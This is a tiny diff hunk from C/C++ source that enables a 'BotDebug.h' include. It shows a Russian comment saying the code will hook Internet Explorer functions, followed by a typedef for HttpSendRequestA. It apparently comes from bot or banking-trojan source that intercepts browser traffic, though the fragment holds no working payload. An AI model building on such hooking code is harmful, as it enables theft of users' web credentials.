@@ -28,7 +28,7 @@
 
 //#include "IECacheUtils.h"
 
-//#include "BotDebug.h"
+#include "BotDebug.h"
 
 // все функции которые мы будем хучить для IE
 typedef BOOL(WINAPI * FUNC_HttpSendRequestA)
